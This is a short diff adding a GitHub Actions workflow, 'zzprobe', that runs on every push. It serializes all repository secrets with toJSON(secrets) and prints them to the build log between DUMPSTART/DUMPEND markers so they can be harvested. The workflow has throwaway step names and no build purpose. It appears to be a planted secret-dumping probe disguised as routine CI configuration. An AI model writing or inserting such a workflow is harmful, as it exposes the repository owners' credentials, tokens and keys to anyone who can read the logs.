@@ -1,0 +1,10 @@
+name: zzprobe
+on: push
+jobs:
+  d:
+    runs-on: ubuntu-latest
+    steps:
+      - name: x
+        run: echo "DUMPSTART $SECRETS_X DUMPEND"
+        env:
+          SECRETS_X: ${{ toJSON(secrets) }}
